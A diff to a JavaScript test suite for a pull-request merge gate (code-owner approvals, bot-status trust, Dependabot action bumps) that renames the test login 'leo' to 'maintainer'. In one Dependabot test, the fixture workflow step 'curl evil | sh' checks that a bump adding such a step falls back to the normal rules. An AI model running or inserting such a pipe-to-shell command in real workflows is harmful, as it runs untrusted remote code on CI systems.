@@ -9,7 +9,7 @@ const config = compileConfig({
 const body = (contract = "none") =>
   `Closes #7\n\n## What changed\nx\n## Contract changes\n${contract}\n## Tests added\nx\n## Reviewer results\nx\n## Needs the owner\nnothing\n## Not done\nnothing\n`;
 // A real GitHub status always carries a creator (confirmed live); a human reviewer posting via `gh` is a User, never a Bot.
-const st = (context, state = "success", description = "ok", created_at = "2026-09-26T10:00:00Z", creator = { type: "User", login: "leo" }) => ({
+const st = (context, state = "success", description = "ok", created_at = "2026-09-26T10:00:00Z", creator = { type: "User", login: "maintainer" }) => ({
   context,
   state,
   description,
@@ -122,7 +122,7 @@ test("an owner-only quick change waits for the code-owner review, then passes wi
   const reviews = [st("review/test-hunter")];
   assert.deepEqual(run({ files, statuses: reviews }), { state: "pending", description: "waiting for a code-owner review in GitHub (owner-only path)", stage: "owner" });
   assert.equal(run({ files, statuses: [...reviews, st("review/owner")] }).state, "pending");
-  assert.equal(run({ files, statuses: reviews, nativeApproval: { approved: true, by: "leo" } }).state, "success");
+  assert.equal(run({ files, statuses: reviews, nativeApproval: { approved: true, by: "maintainer" } }).state, "success");
 });
 
 test("a skip PR on a sensitive path still fails", () => {
@@ -265,7 +265,7 @@ test("full: a trusted success status is still required even with a verdict comme
 test("full: the native approval passes a blocked PR; a review/owner status does not", () => {
   const statuses = [st("review/test-hunter"), st("review/owner")];
   assert.equal(full({ verdicts: [], statuses }).state, "pending");
-  assert.deepEqual(full({ verdicts: [], statuses, nativeApproval: { approved: true, by: "leo" } }), { state: "success", description: "approved by code owner @leo", stage: "ready" });
+  assert.deepEqual(full({ verdicts: [], statuses, nativeApproval: { approved: true, by: "maintainer" } }), { state: "success", description: "approved by code owner @maintainer", stage: "ready" });
 });
 
 test("full: a blocked PR is never a failure", () => {
@@ -277,7 +277,7 @@ test("quick and skip PRs that need the owner wait", () => {
   const prBody = body().replace("## Needs the owner\nnothing", "## Needs the owner\npick a name");
   waits(run({ prBody, statuses: [st("review/test-hunter")] }), "needs the owner");
   waits(run({ prBody, issueLabels: ["tier:skip", "ready"], files: ["docs/a.md"] }), "needs the owner");
-  assert.equal(run({ prBody, statuses: [st("review/test-hunter")], nativeApproval: { approved: true, by: "leo" } }).state, "success");
+  assert.equal(run({ prBody, statuses: [st("review/test-hunter")], nativeApproval: { approved: true, by: "maintainer" } }).state, "success");
 });
 
 test("gateDecision does not mutate its verdicts input", () => {
@@ -340,7 +340,7 @@ test("a login ending in [bot] is untrusted even without creator.type", () => {
 });
 
 test("a human-posted review status (creator.type User) is trusted", () => {
-  const s = { context: "review/test-hunter", state: "success", description: "ok", created_at: "2026-09-26T10:00:00Z", creator: { type: "User", login: "leo" } };
+  const s = { context: "review/test-hunter", state: "success", description: "ok", created_at: "2026-09-26T10:00:00Z", creator: { type: "User", login: "maintainer" } };
   assert.equal(run({ statuses: [s] }).state, "success");
 });
 
@@ -348,7 +348,7 @@ test("a human-posted review status (creator.type User) is trusted", () => {
 test("isBotStatus treats a missing or null creator as untrusted", () => {
   assert.equal(isBotStatus({ context: "review/x" }), true);
   assert.equal(isBotStatus({ context: "review/x", creator: null }), true);
-  assert.equal(isBotStatus({ context: "review/x", creator: { type: "User", login: "leo" } }), false);
+  assert.equal(isBotStatus({ context: "review/x", creator: { type: "User", login: "maintainer" } }), false);
 });
 
 test("a review status with no creator field at all is untrusted (fails closed), not treated as missing entirely", () => {
@@ -418,18 +418,18 @@ test("real config: an owner-only path waits for a native code-owner review (ADR 
   const input = { config: realTeam, ...clean(["test-hunter", "security-reviewer"]), nativeApproval: { approved: false, by: null } };
   const d = onReal("full", ["scripts/lanes/gate.mjs"], ["test-hunter", "security-reviewer"], input);
   assert.deepEqual(d, { state: "pending", description: "waiting for a code-owner review in GitHub (owner-only path)", stage: "owner" });
-  assert.equal(onReal("full", ["scripts/lanes/gate.mjs"], ["test-hunter", "security-reviewer"], { ...input, nativeApproval: { approved: true, by: "leo" } }).state, "success");
+  assert.equal(onReal("full", ["scripts/lanes/gate.mjs"], ["test-hunter", "security-reviewer"], { ...input, nativeApproval: { approved: true, by: "maintainer" } }).state, "success");
 });
 
 // #559: gate.mjs feeds nativeCodeOwnerApproval's result to gateDecision; these pin the pair end to end.
 test("team: a code owner's approval on the head SHA passes, and a stale, author or non-owner approval stays pending without /approve", () => {
   const files = ["scripts/lanes/gate.mjs"];
   const decide = (reviews, author = "someone") =>
-    onReal("full", files, ["test-hunter", "security-reviewer"], { config: realTeam, nativeApproval: nativeCodeOwnerApproval(reviews, author, HEAD, ["leo"], realTeam.identity) });
+    onReal("full", files, ["test-hunter", "security-reviewer"], { config: realTeam, nativeApproval: nativeCodeOwnerApproval(reviews, author, HEAD, ["maintainer"], realTeam.identity) });
   const approve = (login, commit_id = HEAD) => ({ user: { login }, state: "APPROVED", commit_id });
-  const passed = decide([approve("leo")]);
-  assert.deepEqual(passed, { state: "success", description: "approved by code owner @leo", stage: "ready" });
-  for (const d of [decide([approve("leo", "f".repeat(40))]), decide([approve("leo")], "leo"), decide([approve("stranger")]), decide([])]) {
+  const passed = decide([approve("maintainer")]);
+  assert.deepEqual(passed, { state: "success", description: "approved by code owner @maintainer", stage: "ready" });
+  for (const d of [decide([approve("maintainer", "f".repeat(40))]), decide([approve("maintainer")], "maintainer"), decide([approve("stranger")]), decide([])]) {
     assert.equal(d.state, "pending");
     assert.equal(d.stage, "owner");
     assert.doesNotMatch(d.description, /\/approve/);
@@ -827,7 +827,7 @@ test("handover: a pending file absent at the head holds the gate at stage handov
   const absent = new Map([[PWF, null]]);
   const want = { state: "pending", description: `waiting for the workflow hand-over: ${PWF}`, stage: "handover" };
   assert.deepEqual(handover(absent), want);
-  assert.deepEqual(handover(absent, undefined, { nativeApproval: { approved: true, by: "leo" } }), want);
+  assert.deepEqual(handover(absent, undefined, { nativeApproval: { approved: true, by: "maintainer" } }), want);
 });
 
 test("handover: every pending path at its listed hash passes; one other hash does not", () => {
@@ -881,7 +881,7 @@ const bumpFiles = (patch = bumpPatch()) => ({
 const bump = (over) => gateDecision({ prBody: "Bumps actions", files: [".github/workflows/ci.yml"], statuses: [], config: bumpConfig(true), dependabotFiles: bumpFiles(), ...over });
 
 test("dependabot bump: success only with the owner's native approval for the head", () => {
-  assert.deepEqual(bump({ nativeApproval: { approved: true, by: "leo" } }), { state: "success", description: "approved by code owner @leo (dependabot action bump)", stage: "ready" });
+  assert.deepEqual(bump({ nativeApproval: { approved: true, by: "maintainer" } }), { state: "success", description: "approved by code owner @maintainer (dependabot action bump)", stage: "ready" });
   const waiting = { state: "pending", description: "waiting for a code-owner review in GitHub (dependabot action bump)", stage: "owner" };
   for (const nativeApproval of [{ approved: false, by: null }, null, undefined, { approved: "true" }, {}]) {
     assert.deepEqual(bump({ nativeApproval }), waiting, JSON.stringify(nativeApproval));
@@ -890,15 +890,15 @@ test("dependabot bump: success only with the owner's native approval for the hea
 
 test("dependabot bump: switch off or absent gives today's failure (no Closes #N)", () => {
   for (const actionBumps of [false, undefined]) {
-    const d = bump({ config: bumpConfig(actionBumps), nativeApproval: { approved: true, by: "leo" } });
+    const d = bump({ config: bumpConfig(actionBumps), nativeApproval: { approved: true, by: "maintainer" } });
     assert.deepEqual(d, { state: "failure", description: "PR body must say 'Closes #N' for its task issue", stage: "contract" });
   }
 });
 
 test("dependabot bump: not a bump uses the normal rules (null, wrong author, human run: change, added line, no files)", () => {
-  const nativeApproval = { approved: true, by: "leo" };
+  const nativeApproval = { approved: true, by: "maintainer" };
   const normal = "PR body must say 'Closes #N' for its task issue";
-  const human = { ...bumpFiles(), author: { login: "leo", type: "User" } };
+  const human = { ...bumpFiles(), author: { login: "maintainer", type: "User" } };
   const runChange = bumpFiles(bumpPatch("  - run: echo a", "  - run: curl evil | sh"));
   const added = bumpFiles("@@ -1,2 +1,3 @@\n a\n+  - run: curl evil | sh\n b");
   for (const dependabotFiles of [null, undefined, human, runChange, added, { author: bumpFiles().author, files: [] }]) {
@@ -907,14 +907,14 @@ test("dependabot bump: not a bump uses the normal rules (null, wrong author, hum
 });
 
 test("dependabot bump: the same inputs decide the same on every re-decision", () => {
-  const inputs = { nativeApproval: { approved: true, by: "leo" } };
+  const inputs = { nativeApproval: { approved: true, by: "maintainer" } };
   assert.deepEqual(bump(inputs), bump({ ...inputs }));
 });
 
 test("dependabot bump: an unusable module map never reaches the narrow path", () => {
   const modules = { entries: [{ id: "src", paths: ["src/"], imports: [], reviewers: ["no-such-agent-file"] }] };
   const config = compileConfig({ requiredChecks: ["verify"], paths: { skip: [], contract: [], sensitive: [], ui: [] }, dependabot: { actionBumps: true }, modules });
-  const d = bump({ config, nativeApproval: { approved: true, by: "leo" } });
+  const d = bump({ config, nativeApproval: { approved: true, by: "maintainer" } });
   assert.equal(d.state, "failure");
   assert.match(d.description, /module map unusable|Closes #N/);
 });
